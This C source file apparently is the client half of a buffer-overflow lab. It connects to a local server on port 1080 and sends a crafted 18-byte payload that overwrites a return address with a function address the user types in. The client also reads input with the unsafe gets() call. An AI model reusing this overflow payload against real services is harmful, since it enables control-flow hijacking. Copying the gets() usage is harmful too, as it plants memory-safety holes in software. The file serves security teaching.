#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define MAX 80
#define OVRFLOW_LEN 18
#define NORMAL_LEN 10
#define SRV_PORT 1080

#define SA struct sockaddr

int getNum(char ch)
{
    int num=0;
    if(ch>='0' && ch<='9')
    {
        num=ch-0x30;
    }
    else
    {
        switch(ch)
        {
            case 'A': case 'a': num=10; break;
            case 'B': case 'b': num=11; break;
            case 'C': case 'c': num=12; break;
            case 'D': case 'd': num=13; break;
            case 'E': case 'e': num=14; break;
            case 'F': case 'f': num=15; break;
            default: num=0;
        }
    }
    return num;
}

//function : hex2int
//this function will return integer value against
//hexValue - which is in string format

unsigned int hex2int(unsigned char hex[])
{
    unsigned int x=0;
    x=(getNum(hex[0]))*16+(getNum(hex[1]));
    return x;
}


// Driver function
int main()
{
    int client_sockfd;
    struct sockaddr_in servaddr;
    char answer[MAX];
    int i,j;
    char buff[MAX] = "aaaaaaaaaa";
    buff[10] = 0x00;
    buff[11] = 0x14;
    buff[12] = 0x6f;
    buff[13] = 0x55;
    buff[14] = 0x55;
    buff[15] = 0x55;
    buff[16] = 0x00;
    buff[17] = 0x00;


    // socket create and varification
    client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else{
        printf("Client Socket Created\n");
    }

    bzero((char *)&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(SRV_PORT);


    // connect the client socket to the server
    if (connect(client_sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else{
        printf("connected to the server..\n");
    }

    while(1){
       printf("<N>ormal or <O>verflow run?, <Q> to quit: ");
       gets(answer);
       printf("Answer %s\n",answer);
       if (answer[0]=='n' || answer[0]=='N'){
          printf("Normal\n");
          buff[NORMAL_LEN]='\0';
          write(client_sockfd, buff, NORMAL_LEN);
       } else if (answer[0]=='o' || answer[0]=='O') {
          printf("Overflow\n");
          printf("Function address:");
          gets(answer);
          buff[10] = 0x00;
          buff[11] = 0x00;
          /* Add six more bytes */
         for(i=0,j=2;i<=11;i+=2,j+=2){
             buff[12 + i/2] = hex2int(&answer[j]);
          }
          for(int i=0;i<OVRFLOW_LEN;i++){
             printf("0x%2X ",buff[i]);
         }
          printf("\n");
          write(client_sockfd, buff, OVRFLOW_LEN);
       }
       else if (answer[0]=='q' || answer[0]=='Q'){
          break;
       }
    }
    close(client_sockfd);
}
